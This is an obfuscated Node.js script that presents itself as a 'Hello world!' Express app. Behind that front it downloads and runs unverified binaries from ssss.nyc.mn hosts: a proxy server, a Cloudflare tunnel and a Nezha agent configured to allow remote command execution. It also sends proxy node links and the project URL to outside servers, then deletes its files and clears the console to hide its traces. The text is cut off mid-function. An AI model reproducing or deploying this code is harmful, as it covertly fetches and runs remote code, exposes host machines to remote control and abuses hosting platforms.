const _0x1dd1c3=_0x1f0a;(function(_0x32b39b,_0x57c8a8){const _0x5a6c2d=_0x1f0a,_0x3ebbb7=_0x32b39b();while(!![]){try{const _0x17d7b2=-parseInt(_0x5a6c2d(0x1c0))/0x1+-parseInt(_0x5a6c2d(0x1cf))/0x2+parseInt(_0x5a6c2d(0x21e))/0x3*(parseInt(_0x5a6c2d(0x249))/0x4)+-parseInt(_0x5a6c2d(0x233))/0x5+parseInt(_0x5a6c2d(0x241))/0x6+parseInt(_0x5a6c2d(0x1be))/0x7+-parseInt(_0x5a6c2d(0x23e))/0x8;if(_0x17d7b2===_0x57c8a8)break;else _0x3ebbb7['push'](_0x3ebbb7['shift']());}catch(_0x5ba6d3){_0x3ebbb7['push'](_0x3ebbb7['shift']());}}}(_0x3487,0x330a6));const express=require(_0x1dd1c3(0x1e7)),app=express(),axios=require(_0x1dd1c3(0x1b3)),os=require('os'),fs=require('fs'),path=require(_0x1dd1c3(0x19e)),{promisify}=require('util'),exec=promisify(require(_0x1dd1c3(0x1cc))[_0x1dd1c3(0x20f)]),{execSync}=require(_0x1dd1c3(0x1cc)),UPLOAD_URL=process[_0x1dd1c3(0x23d)][_0x1dd1c3(0x1e8)]||'',PROJECT_URL=process[_0x1dd1c3(0x23d)][_0x1dd1c3(0x1a2)]||'',AUTO_ACCESS=process[_0x1dd1c3(0x23d)][_0x1dd1c3(0x211)]||![],FILE_PATH=process[_0x1dd1c3(0x23d)][_0x1dd1c3(0x1c6)]||_0x1dd1c3(0x1d6),SUB_PATH=process[_0x1dd1c3(0x23d)][_0x1dd1c3(0x1ff)]||_0x1dd1c3(0x227),PORT=process['env'][_0x1dd1c3(0x1fb)]||process[_0x1dd1c3(0x23d)][_0x1dd1c3(0x1de)]||0xbb8,UUID=process[_0x1dd1c3(0x23d)][_0x1dd1c3(0x24f)]||'047712f8-a8fe-4b0e-a6ed-3f2cf6a03cbe',NEZHA_SERVER=process['env'][_0x1dd1c3(0x201)]||'',NEZHA_PORT=process[_0x1dd1c3(0x23d)][_0x1dd1c3(0x251)]||'',NEZHA_KEY=process[_0x1dd1c3(0x23d)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x1dd1c3(0x23d)]['ARGO_DOMAIN']||_0x1dd1c3(0x212),ARGO_AUTH=process[_0x1dd1c3(0x23d)][_0x1dd1c3(0x234)]||_0x1dd1c3(0x1d4),ARGO_PORT=process['env'][_0x1dd1c3(0x258)]||0x1f41,CFIP=process[_0x1dd1c3(0x23d)][_0x1dd1c3(0x215)]||_0x1dd1c3(0x1a4),CFPORT=process[_0x1dd1c3(0x23d)][_0x1dd1c3(0x240)]||0x1bb,NAME=process[_0x1dd1c3(0x23d)][_0x1dd1c3(0x1f9)]||'nodejs-cfargo1';!fs[_0x1dd1c3(0x1f7)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x1dd1c3(0x209)](FILE_PATH+_0x1dd1c3(0x1bb))):console['log'](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x12a662=_0x1dd1c3,_0x178234=_0x12a662(0x24e);let _0x2e871c='';for(let _0x163018=0x0;_0x163018<0x6;_0x163018++){_0x2e871c+=_0x178234[_0x12a662(0x257)](Math[_0x12a662(0x1dd)](Math['random']()*_0x178234[_0x12a662(0x25b)]));}return _0x2e871c;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();function _0x1f0a(_0x52ccdf,_0xd22c99){_0x52ccdf=_0x52ccdf-0x19c;const _0x34874e=_0x3487();let _0x1f0a1c=_0x34874e[_0x52ccdf];return _0x1f0a1c;}let npmPath=path[_0x1dd1c3(0x1f8)](FILE_PATH,npmName),phpPath=path[_0x1dd1c3(0x1f8)](FILE_PATH,phpName),webPath=path[_0x1dd1c3(0x1f8)](FILE_PATH,webName),botPath=path[_0x1dd1c3(0x1f8)](FILE_PATH,botName),subPath=path[_0x1dd1c3(0x1f8)](FILE_PATH,_0x1dd1c3(0x219)),listPath=path[_0x1dd1c3(0x1f8)](FILE_PATH,_0x1dd1c3(0x1d7)),bootLogPath=path[_0x1dd1c3(0x1f8)](FILE_PATH,'boot.log'),configPath=path[_0x1dd1c3(0x1f8)](FILE_PATH,_0x1dd1c3(0x226));function deleteNodes(){const _0x17398f=_0x1dd1c3;try{if(!UPLOAD_URL)return;if(!fs[_0x17398f(0x1f7)](subPath))return;let _0x215f2d;try{_0x215f2d=fs[_0x17398f(0x230)](subPath,_0x17398f(0x23b));}catch{return null;}const _0x25a587=Buffer['from'](_0x215f2d,'base64')['toString'](_0x17398f(0x23b)),_0x18ecf6=_0x25a587[_0x17398f(0x1a6)]('\x0a')['filter'](_0x3a7a2a=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x17398f(0x1b9)](_0x3a7a2a));if(_0x18ecf6['length']===0x0)return;return axios[_0x17398f(0x224)](UPLOAD_URL+'/api/delete-nodes',JSON['stringify']({'nodes':_0x18ecf6}),{'headers':{'Content-Type':_0x17398f(0x202)}})['catch'](_0x3f9015=>{return null;}),null;}catch(_0x1c9c94){return null;}}function cleanupOldFiles(){const _0x52618f=_0x1dd1c3;try{const _0x4627ea=fs[_0x52618f(0x218)](FILE_PATH);_0x4627ea[_0x52618f(0x25c)](_0x1babe0=>{const _0x579f74=_0x52618f,_0x267c0e=path['join'](FILE_PATH,_0x1babe0);try{const _0x1cf6e7=fs[_0x579f74(0x1e6)](_0x267c0e);_0x1cf6e7[_0x579f74(0x23a)]()&&fs[_0x579f74(0x1bd)](_0x267c0e);}catch(_0x4ec651){}});}catch(_0x4882b3){}}app[_0x1dd1c3(0x1ea)]('/',function(_0x55404c,_0x3412eb){const _0x586c23=_0x1dd1c3;_0x3412eb[_0x586c23(0x1ee)]('Hello\x20world!');});async function generateConfig(){const _0x1be2c5=_0x1dd1c3,_0x35e546={'log':{'access':_0x1be2c5(0x231),'error':_0x1be2c5(0x231),'loglevel':_0x1be2c5(0x1ca)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x1be2c5(0x1a5),'settings':{'clients':[{'id':UUID,'flow':_0x1be2c5(0x1ef)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x1be2c5(0x247),'dest':0xbba},{'path':_0x1be2c5(0x1cb),'dest':0xbbb},{'path':_0x1be2c5(0x236),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x1be2c5(0x1fd),'protocol':_0x1be2c5(0x1a5),'settings':{'clients':[{'id':UUID}],'decryption':_0x1be2c5(0x1ca)},'streamSettings':{'network':_0x1be2c5(0x22a),'security':'none'}},{'port':0xbba,'listen':_0x1be2c5(0x1fd),'protocol':_0x1be2c5(0x1a5),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x1be2c5(0x1ca)},'streamSettings':{'network':'ws','security':_0x1be2c5(0x1ca),'wsSettings':{'path':_0x1be2c5(0x247)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x1be2c5(0x1ce),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x1be2c5(0x1fd),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x1be2c5(0x1cb)}},'sniffing':{'enabled':!![],'destOverride':[_0x1be2c5(0x1ad),'tls',_0x1be2c5(0x1d1)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x1be2c5(0x1fd),'protocol':_0x1be2c5(0x1ab),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x1be2c5(0x236)}},'sniffing':{'enabled':!![],'destOverride':[_0x1be2c5(0x1ad),_0x1be2c5(0x1ce),_0x1be2c5(0x1d1)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x1be2c5(0x1c7),'tag':_0x1be2c5(0x1f4)},{'protocol':_0x1be2c5(0x24a),'tag':_0x1be2c5(0x206)}]};fs[_0x1be2c5(0x250)](path[_0x1be2c5(0x1f8)](FILE_PATH,_0x1be2c5(0x226)),JSON[_0x1be2c5(0x222)](_0x35e546,null,0x2));}function getSystemArchitecture(){const _0x269c7a=_0x1dd1c3,_0x23c854=os[_0x269c7a(0x1cd)]();return _0x23c854===_0x269c7a(0x1ec)||_0x23c854===_0x269c7a(0x20b)||_0x23c854==='aarch64'?_0x269c7a(0x1ec):'amd';}function downloadFile(_0x27eb23,_0x15a0f6,_0x5befbc){const _0x17ac65=_0x1dd1c3,_0x37d7e5=_0x27eb23;!fs[_0x17ac65(0x1f7)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x1aed63=fs[_0x17ac65(0x232)](_0x37d7e5);axios({'method':_0x17ac65(0x1ea),'url':_0x15a0f6,'responseType':'stream'})[_0x17ac65(0x1eb)](_0x40260f=>{const _0x4f156c=_0x17ac65;_0x40260f[_0x4f156c(0x21d)]['pipe'](_0x1aed63),_0x1aed63['on']('finish',()=>{const _0x537447=_0x4f156c;_0x1aed63[_0x537447(0x216)](),console[_0x537447(0x209)](_0x537447(0x239)+path[_0x537447(0x242)](_0x37d7e5)+_0x537447(0x1c3)),_0x5befbc(null,_0x37d7e5);}),_0x1aed63['on']('error',_0x23d3e2=>{const _0x23baae=_0x4f156c;fs[_0x23baae(0x1ed)](_0x37d7e5,()=>{});const _0x1f13d4=_0x23baae(0x239)+path[_0x23baae(0x242)](_0x37d7e5)+_0x23baae(0x203)+_0x23d3e2[_0x23baae(0x238)];console['error'](_0x1f13d4),_0x5befbc(_0x1f13d4);});})[_0x17ac65(0x25a)](_0x3488b3=>{const _0x241575=_0x17ac65,_0x3f8bfa=_0x241575(0x239)+path[_0x241575(0x242)](_0x37d7e5)+_0x241575(0x203)+_0x3488b3['message'];console[_0x241575(0x1c4)](_0x3f8bfa),_0x5befbc(_0x3f8bfa);});}async function downloadFilesAndRun(){const _0x221de8=_0x1dd1c3,_0x4edce7=getSystemArchitecture(),_0x3691fc=getFilesForArchitecture(_0x4edce7);if(_0x3691fc['length']===0x0){console[_0x221de8(0x209)](_0x221de8(0x1e0));return;}const _0x3b63e1=_0x3691fc[_0x221de8(0x207)](_0x3dd127=>{return new Promise((_0x1c2540,_0x4c85ef)=>{const _0x3678b9=_0x1f0a;downloadFile(_0x3dd127[_0x3678b9(0x1b6)],_0x3dd127[_0x3678b9(0x22f)],(_0x3a03f2,_0xea2159)=>{_0x3a03f2?_0x4c85ef(_0x3a03f2):_0x1c2540(_0xea2159);});});});try{await Promise[_0x221de8(0x21b)](_0x3b63e1);}catch(_0xaf86f3){console[_0x221de8(0x1c4)](_0x221de8(0x200),_0xaf86f3);return;}function _0x542e94(_0x5a2696){const _0x117b76=_0x221de8,_0x255a92=0x1fd;_0x5a2696[_0x117b76(0x25c)](_0x52de5=>{const _0x57406e=_0x117b76;fs['existsSync'](_0x52de5)&&fs[_0x57406e(0x1a9)](_0x52de5,_0x255a92,_0x57e9b2=>{const _0x193c94=_0x57406e;_0x57e9b2?console[_0x193c94(0x1c4)](_0x193c94(0x1a3)+_0x52de5+':\x20'+_0x57e9b2):console[_0x193c94(0x209)](_0x193c94(0x1d8)+_0x52de5+':\x20'+_0x255a92[_0x193c94(0x1fc)](0x8));});});}const _0x1ed39b=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x542e94(_0x1ed39b);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2cc14c=NEZHA_SERVER[_0x221de8(0x1e4)](':')?NEZHA_SERVER[_0x221de8(0x1a6)](':')[_0x221de8(0x1e9)]():'',_0x532ede=new Set([_0x221de8(0x1f0),_0x221de8(0x24b),'2096','2087','2083','2053']),_0x3a7d1f=_0x532ede[_0x221de8(0x228)](_0x2cc14c)?_0x221de8(0x1b2):'false',_0x28d878='\x0aclient_secret:\x20'+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x221de8(0x1b5)+_0x3a7d1f+_0x221de8(0x1d3)+UUID;fs['writeFileSync'](path[_0x221de8(0x1f8)](FILE_PATH,'config.yaml'),_0x28d878);const _0x215fb8=_0x221de8(0x256)+phpPath+_0x221de8(0x204)+FILE_PATH+_0x221de8(0x1a8);try{await exec(_0x215fb8),console[_0x221de8(0x209)](phpName+_0x221de8(0x1fe)),await new Promise(_0x3aef1b=>setTimeout(_0x3aef1b,0x3e8));}catch(_0x304203){console[_0x221de8(0x1c4)](_0x221de8(0x1b7)+_0x304203);}}else{let _0x42c480='';const _0x30f9b1=['443','8443',_0x221de8(0x23c),_0x221de8(0x1ae),'2083',_0x221de8(0x244)];_0x30f9b1['includes'](NEZHA_PORT)&&(_0x42c480=_0x221de8(0x22b));const _0x59d2b9='nohup\x20'+npmPath+_0x221de8(0x21f)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x42c480+_0x221de8(0x221);try{await exec(_0x59d2b9),console[_0x221de8(0x209)](npmName+'\x20is\x20running'),await new Promise(_0x2d774a=>setTimeout(_0x2d774a,0x3e8));}catch(_0x53d5ee){console[_0x221de8(0x1c4)]('npm\x20running\x20error:\x20'+_0x53d5ee);}}}else console['log'](_0x221de8(0x1e2));const _0x3e1a19=_0x221de8(0x256)+webPath+_0x221de8(0x1d0)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x3e1a19),console['log'](webName+'\x20is\x20running'),await new Promise(_0x4ccd28=>setTimeout(_0x4ccd28,0x3e8));}catch(_0x212880){console[_0x221de8(0x1c4)](_0x221de8(0x24c)+_0x212880);}if(fs[_0x221de8(0x1f7)](botPath)){let _0x2acc4d;if(ARGO_AUTH[_0x221de8(0x1bf)](/^[A-Z0-9a-z=]{120,250}$/))_0x2acc4d=_0x221de8(0x1ac)+ARGO_AUTH;else ARGO_AUTH[_0x221de8(0x1bf)](/TunnelSecret/)?_0x2acc4d=_0x221de8(0x1f3)+FILE_PATH+'/tunnel.yml\x20run':_0x2acc4d=_0x221de8(0x1c2)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x221de8(0x256)+botPath+'\x20'+_0x2acc4d+_0x221de8(0x205)),console[_0x221de8(0x209)](botName+_0x221de8(0x1fe)),await new Promise(_0x420a7e=>setTimeout(_0x420a7e,0x7d0));}catch(_0x1c24cf){console['error'](_0x221de8(0x1dc)+_0x1c24cf);}}await new Promise(_0x462b19=>setTimeout(_0x462b19,0x1388));}function getFilesForArchitecture(_0x12dcda){const _0x3597b9=_0x1dd1c3;let _0x15cb5b;_0x12dcda===_0x3597b9(0x1ec)?_0x15cb5b=[{'fileName':webPath,'fileUrl':_0x3597b9(0x20c)},{'fileName':botPath,'fileUrl':_0x3597b9(0x254)}]:_0x15cb5b=[{'fileName':webPath,'fileUrl':_0x3597b9(0x237)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x3830ca=_0x12dcda===_0x3597b9(0x1ec)?_0x3597b9(0x24d):_0x3597b9(0x229);_0x15cb5b[_0x3597b9(0x22e)]({'fileName':npmPath,'fileUrl':_0x3830ca});}else{const _0x5c831b=_0x12dcda===_0x3597b9(0x1ec)?_0x3597b9(0x1db):_0x3597b9(0x22d);_0x15cb5b[_0x3597b9(0x22e)]({'fileName':phpPath,'fileUrl':_0x5c831b});}}return _0x15cb5b;}function argoType(){const _0x294f0d=_0x1dd1c3;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x294f0d(0x209)](_0x294f0d(0x23f));return;}if(ARGO_AUTH['includes'](_0x294f0d(0x1a1))){fs['writeFileSync'](path[_0x294f0d(0x1f8)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x1fa922='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x294f0d(0x1a6)]('\x22')[0xb]+_0x294f0d(0x1f5)+path[_0x294f0d(0x1f8)](FILE_PATH,_0x294f0d(0x1fa))+_0x294f0d(0x1b0)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x294f0d(0x1f1);fs[_0x294f0d(0x250)](path[_0x294f0d(0x1f8)](FILE_PATH,_0x294f0d(0x1d9)),_0x1fa922);}else console[_0x294f0d(0x209)](_0x294f0d(0x19c));}async function extractDomains(){const _0x597444=_0x1dd1c3;let _0xc646ab;if(ARGO_AUTH&&ARGO_DOMAIN)_0xc646ab=ARGO_DOMAIN,console[_0x597444(0x209)]('ARGO_DOMAIN:',_0xc646ab),await _0x1f70fa(_0xc646ab);else try{const _0x3b1ffa=fs[_0x597444(0x230)](path[_0x597444(0x1f8)](FILE_PATH,_0x597444(0x253)),_0x597444(0x23b)),_0x1bb00b=_0x3b1ffa[_0x597444(0x1a6)]('\x0a'),_0x510f43=[];_0x1bb00b[_0x597444(0x25c)](_0x35dab9=>{const _0x3d728e=_0x597444,_0x288ca5=_0x35dab9[_0x3d728e(0x1bf)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x288ca5){const _0x2db9b3=_0x288ca5[0x1];_0x510f43[_0x3d728e(0x1a0)](_0x2db9b3);}});if(_0x510f43[_0x597444(0x25b)]>0x0)_0xc646ab=_0x510f43[0x0],console['log'](_0x597444(0x20a),_0xc646ab),await _0x1f70fa(_0xc646ab);else{console[_0x597444(0x209)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x597444(0x1bd)](path[_0x597444(0x1f8)](FILE_PATH,'boot.log'));async function _0x57cb29(){const _0x42599b=_0x597444;try{process[_0x42599b(0x214)]===_0x42599b(0x1ba)?await exec(_0x42599b(0x1f2)+botName+_0x42599b(0x1c5)):await exec('pkill\x20-f\x20\x22['+botName[_0x42599b(0x257)](0x0)+']'+botName[_0x42599b(0x1e5)](0x1)+_0x42599b(0x248));}catch(_0x1a6e30){}}_0x57cb29(),await new Promise(_0x1ddf4f=>setTimeout(_0x1ddf4f,0xbb8));const _0x47c332=_0x597444(0x1c2)+FILE_PATH+_0x597444(0x217)+ARGO_PORT;try{await exec(_0x597444(0x256)+botPath+'\x20'+_0x47c332+_0x597444(0x205)),console[_0x597444(0x209)](botName+_0x597444(0x1fe)),await new Promise(_0x4a9715=>setTimeout(_0x4a9715,0xbb8)),await extractDomains();}catch(_0x54ab22){console[_0x597444(0x1c4)](_0x597444(0x1dc)+_0x54ab22);}}}catch(_0x5aa03b){console[_0x597444(0x1c4)]('Error\x20reading\x20boot.log:',_0x5aa03b);}async function _0x20166d(){const _0x3da03f=_0x597444;try{const _0x16f4bb=await axios['get'](_0x3da03f(0x1e3),{'timeout':0xbb8});if(_0x16f4bb[_0x3da03f(0x21d)]&&_0x16f4bb[_0x3da03f(0x21d)]['country_code']&&_0x16f4bb[_0x3da03f(0x21d)][_0x3da03f(0x20e)])return _0x16f4bb[_0x3da03f(0x21d)][_0x3da03f(0x255)]+'_'+_0x16f4bb['data'][_0x3da03f(0x20e)];}catch(_0x3c06ba){try{const _0x2d0c34=await axios['get'](_0x3da03f(0x213),{'timeout':0xbb8});if(_0x2d0c34[_0x3da03f(0x21d)]&&_0x2d0c34[_0x3da03f(0x21d)]['status']==='success'&&_0x2d0c34[_0x3da03f(0x21d)][_0x3da03f(0x1a7)]&&_0x2d0c34[_0x3da03f(0x21d)][_0x3da03f(0x20e)])return _0x2d0c34[_0x3da03f(0x21d)][_0x3da03f(0x1a7)]+'_'+_0x2d0c34[_0x3da03f(0x21d)][_0x3da03f(0x20e)];}catch(_0x3618f1){}}return'Unknown';}async function _0x1f70fa(_0x3015a2){const _0x5486db=await _0x20166d(),_0x324f1e=NAME?NAME+'-'+_0x5486db:_0x5486db;return new Promise(_0x5ef0ed=>{setTimeout(()=>{const _0x3796c8=_0x1f0a,_0x2308c9={'v':'2','ps':''+_0x324f1e,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x3796c8(0x1ca),'net':'ws','type':_0x3796c8(0x1ca),'host':_0x3015a2,'path':_0x3796c8(0x1d5),'tls':'tls','sni':_0x3015a2,'alpn':'','fp':_0x3796c8(0x225)},_0x4e2920=_0x3796c8(0x1b8)+UUID+'@'+CFIP+':'+CFPORT+_0x3796c8(0x1c8)+_0x3015a2+_0x3796c8(0x1da)+_0x3015a2+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x324f1e+_0x3796c8(0x1c1)+Buffer['from'](JSON['stringify'](_0x2308c9))[_0x3796c8(0x1fc)](_0x3796c8(0x1d2))+_0x3796c8(0x1f6)+UUID+'@'+CFIP+':'+CFPORT+_0x3796c8(0x259)+_0x3015a2+'&fp=firefox&type=ws&host='+_0x3015a2+_0x3796c8(0x252)+_0x324f1e+'\x0a\x20\x20\x20\x20';console[_0x3796c8(0x209)](Buffer[_0x3796c8(0x1e1)](_0x4e2920)[_0x3796c8(0x1fc)]('base64')),fs[_0x3796c8(0x250)](subPath,Buffer[_0x3796c8(0x1e1)](_0x4e2920)['toString'](_0x3796c8(0x1d2))),console[_0x3796c8(0x209)](FILE_PATH+_0x3796c8(0x22c)),uploadNodes(),app[_0x3796c8(0x1ea)]('/'+SUB_PATH,(_0x2282a3,_0x108258)=>{const _0x4cc900=_0x3796c8,_0x8ce0cd=Buffer['from'](_0x4e2920)[_0x4cc900(0x1fc)]('base64');_0x108258['set'](_0x4cc900(0x235),_0x4cc900(0x20d)),_0x108258[_0x4cc900(0x1ee)](_0x8ce0cd);}),_0x5ef0ed(_0x4e2920);},0x7d0);});}}async function uploadNodes(){const _0x38e4b1=_0x1dd1c3;if(UPLOAD_URL&&PROJECT_URL){const _0x1a4c27=PROJECT_URL+'/'+SUB_PATH,_0x3e581f={'subscription':[_0x1a4c27]};try{const _0x108de4=await axios[_0x38e4b1(0x224)](UPLOAD_URL+_0x38e4b1(0x1af),_0x3e581f,{'headers':{'Content-Type':_0x38e4b1(0x202)}});return _0x108de4&&_0x108de4[_0x38e4b1(0x243)]===0xc8?(console[_0x38e4b1(0x209)](_0x38e4b1(0x1b4)),_0x108de4):null;}catch(_0x35ecdb){if(_0x35ecdb[_0x38e4b1(0x19d)]){if(_0x35ecdb['response'][_0x38e4b1(0x243)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x37eb24=fs[_0x38e4b1(0x230)](listPath,_0x38e4b1(0x23b)),_0x54dbd9=_0x37eb24[_0x38e4b1(0x1a6)]('\x0a')['filter'](_0x4f74cc=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x4f74cc));if(_0x54dbd9[_0x38e4b1(0x25b)]===0x0)return;const _0x5d65ba=JSON[_0x38e4b1(0x222)]({'nodes':_0x54dbd9});try{const _0x55d829=await axios['post'](UPLOAD_URL+'/api/add-nodes',_0x5d65ba,{'headers':{'Content-Type':'application/json'}});return _0x55d829&&_0x55d829[_0x38e4b1(0x243)]===0xc8?(console['log'](_0x38e4b1(0x210)),_0x55d829):null;}catch(_0x3ae500){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x3ef699=_0x1f0a,_0x36ff2b=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x36ff2b['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x36ff2b[_0x3ef699(0x1a0)](phpPath);process['platform']===_0x3ef699(0x1ba)?exec('del\x20/f\x20/q\x20'+_0x36ff2b[_0x3ef699(0x1f8)]('\x20')+_0x3ef699(0x1df),_0x27f29f=>{const _0x1e5df9=_0x3ef699;console['clear'](),console[_0x1e5df9(0x209)](_0x1e5df9(0x223)),console[_0x1e5df9(0x209)](_0x1e5df9(0x21c));}):exec(_0x3ef699(0x246)+_0x36ff2b[_0x3ef699(0x1f8)]('\x20')+_0x3ef699(0x1aa),_0x258c28=>{const _0x57d992=_0x3ef699;console['clear'](),console[_0x57d992(0x209)](_0x57d992(0x223)),console[_0x57d992(0x209)](_0x57d992(0x21c));});},0x15f90);}function _0x3487(){const _0x2a6944=['Error\x20in\x20startserver:','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','stringify','App\x20is\x20running','post','firefox','config.json','sub','has','https://amd64.ssss.nyc.mn/agent','tcp','--tls','/sub.txt\x20saved\x20successfully','https://amd64.ssss.nyc.mn/v1','unshift','fileUrl','readFileSync','/dev/null','createWriteStream','16955GLxxFn','ARGO_AUTH','Content-Type','/trojan-argo','https://amd64.ssss.nyc.mn/web','message','Download\x20','isFile','utf-8','2096','env','939832WhoNqA','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','CFPORT','701046fYoxeD','basename','status','2053','Unhandled\x20error\x20in\x20startserver:','rm\x20-rf\x20','/vless-argo','\x22\x20>\x20/dev/null\x202>&1','33556lDVgYp','blackhole','8443','web\x20running\x20error:\x20','https://arm64.ssss.nyc.mn/agent','abcdefghijklmnopqrstuvwxyz','UUID','writeFileSync','NEZHA_PORT','&path=%2Ftrojan-argo%3Fed%3D2560#','boot.log','https://arm64.ssss.nyc.mn/bot','country_code','nohup\x20','charAt','ARGO_PORT','?security=tls&sni=','catch','length','forEach','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','response','path','http\x20server\x20is\x20running\x20on\x20port:','push','TunnelSecret','PROJECT_URL','Empowerment\x20failed\x20for\x20','cdns.doon.eu.org','vless','split','countryCode','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','chmod','\x20>/dev/null\x202>&1','trojan','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','http','2087','/api/add-subscriptions','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','Add\x20automatic\x20access\x20task\x20faild:\x20','true','axios','Subscription\x20uploaded\x20successfully','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','fileName','php\x20running\x20error:\x20','\x0avless://','test','win32','\x20is\x20created','automatic\x20access\x20task\x20added\x20successfully','unlinkSync','1468089Dtoaft','match','73956wburoD','\x0a\x0avmess://','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','\x20successfully','error','.exe\x20>\x20nul\x202>&1','FILE_PATH','freedom','?encryption=none&security=tls&sni=','listen','none','/vmess-argo','child_process','arch','tls','533258WibQpv','\x20-c\x20','quic','base64','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','eyJhIjoiZGI2M2QxODk1ZGMyNjM1MDVlNzhmMjUwOTE3NjkyNmUiLCJ0IjoiNzA3NGEzMzAtZDkxMi00MDIwLWJhYmEtM2QyYmM1MWNkNDMwIiwicyI6Ik5XUmtZVEpsTVRBdE16bG1OUzAwWVRFNUxUa3hNREF0WVRCa1pqazVaalZoWVRFdyJ9','/vmess-argo?ed=2560','./tmp','list.txt','Empowerment\x20success\x20for\x20','tunnel.yml','&fp=firefox&type=ws&host=','https://arm64.ssss.nyc.mn/v1','Error\x20executing\x20command:\x20','floor','PORT','\x20>\x20nul\x202>&1','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','from','NEZHA\x20variable\x20is\x20empty,skip\x20running','https://ipapi.co/json/','includes','substring','statSync','express','UPLOAD_URL','pop','get','then','arm','unlink','send','xtls-rprx-vision','443','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','taskkill\x20/f\x20/im\x20','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','direct','\x0a\x20\x20credentials-file:\x20','\x0a\x0atrojan://','existsSync','join','NAME','tunnel.json','SERVER_PORT','toString','127.0.0.1','\x20is\x20running','SUB_PATH','Error\x20downloading\x20files:','NEZHA_SERVER','application/json','\x20failed:\x20','\x20-c\x20\x22','\x20>/dev/null\x202>&1\x20&','block','map','Skipping\x20adding\x20automatic\x20access\x20task','log','ArgoDomain:','arm64','https://arm64.ssss.nyc.mn/web','text/plain;\x20charset=utf-8','org','exec','Nodes\x20uploaded\x20successfully','AUTO_ACCESS','nodejs-cfargo.fixnet.app','http://ip-api.com/json/','platform','CFIP','close','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','readdirSync','sub.txt','https://oooo.serv00.net/add-url','all','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','data','123rlxUXc','\x20-s\x20'];_0x3487=function(){return _0x2a6944;};return _0x3487();}cleanFiles();async function AddVisitTask(){const _0x3dc45a=_0x1dd1c3;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x3dc45a(0x208));return;}try{const _0x4ed32a=await axios[_0x3dc45a(0x224)](_0x3dc45a(0x21a),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x3dc45a(0x202)}});return console['log'](_0x3dc45a(0x1bc)),_0x4ed32a;}catch(_0x133ea5){return 